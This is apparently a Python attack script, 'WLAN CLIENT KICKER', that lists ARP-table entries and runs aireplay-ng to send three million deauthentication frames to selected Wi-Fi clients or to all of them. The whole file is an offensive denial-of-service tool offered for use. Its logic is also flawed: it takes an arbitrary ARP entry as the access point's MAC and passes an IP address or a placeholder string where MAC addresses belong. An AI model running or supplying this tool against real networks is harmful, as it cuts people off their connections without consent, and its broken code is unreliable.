import subprocess
import pyfiglet
import argparse
import os

def get_arp():
    # Get ARP-table for MAC-Addresses, IPv4s and devicenames
    arp_result = subprocess.run("arp -n", shell=True, capture_output=True, text=True)
    if arp_result.returncode == 0:
        arp_output = arp_result.stdout
        return arp_output
    else:
        print("Error while fetching ARP table:", arp_result.stderr)
        return None

def parse_arp_table(arp_output):
    print("ARP Output:")
    print(arp_output)
    arp_entries = []
    arp_lines = arp_output.split('\n')
    headers = arp_lines[0].split()
    print("Headers:", headers)
    for line in arp_lines[1:]:
        if line.strip():
            parts = line.split()
            if len(parts) >= len(headers):
                entry = {}
                for i, header in enumerate(headers):
                    entry[header] = parts[i]
                arp_entries.append(entry)
    return arp_entries


def display_arp_table(arp_entries):
    if not arp_entries:
        print("ARP Table is empty.")
        return
    else:
        headers = list(arp_entries[0].keys())
        max_lengths = [max(len(entry[header]) for entry in arp_entries) for header in headers]

        # Display header
        print("|".join(f"{header.ljust(length)}" for header, length in zip(headers, max_lengths)))

        # Display separator
        print("-" * sum(max_lengths[i] + 1 for i in range(len(headers))))

        # Display entries
        for i, entry in enumerate(arp_entries):
            print("|".join(f"{entry[header].ljust(max_lengths[j])}" for j, header in enumerate(headers)))

        print()

def kick_client(mac_address_target, mac_address_ap):
    # Kick client using aireplay-ng
    aireplay_command = f"sudo aireplay-ng --deauth 3000000 -a {mac_address_ap} -c {mac_address_target} wlan0"
    subprocess.run(aireplay_command, shell=True)

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Tool to kick clients out of WLAN")
    parser.add_argument("-ip", "--ip_address", help="Set IPv4-address you want to kick")
    parser.add_argument("-arp", "--arpTable", help="Set ARP Switch to show ARP-Table and choose the targets", action="store_true")
    args = parser.parse_args()

    # Print banner
    ascii_banner = pyfiglet.figlet_format("WLAN CLIENT KICKER")
    print(ascii_banner)

    # Fetch and display ARP table
    if args.arpTable:
        arp_output = get_arp()
        if arp_output:
            arp_entries = parse_arp_table(arp_output)
            display_arp_table(arp_entries)
            arp_selection = input("Enter the numbers of the entries you want to kick (comma-separated), or 'ALL' for all entries: ")
            if arp_selection.upper() == 'ALL':
                arp_selection = range(len(arp_entries))
            else:
                arp_selection = map(int, arp_selection.split(','))
            # Find valid AP MAC address
            ap_mac_address = None
            for entry in arp_entries:
                if 'HWaddress' in entry:
                    ap_mac_address = entry['HWaddress']
                    break
            if ap_mac_address:
                for index in arp_selection:
                    kick_client(arp_entries[index]['HWaddress'], ap_mac_address)
            else:
                print("Unable to find a valid AP MAC address.")
        else:
            print("Unable to fetch ARP table. Exiting...")
    else:
        # Kick client
        kick_client(args.ip_address, "AP_MAC_Address")

if __name__ == "__main__":
    main()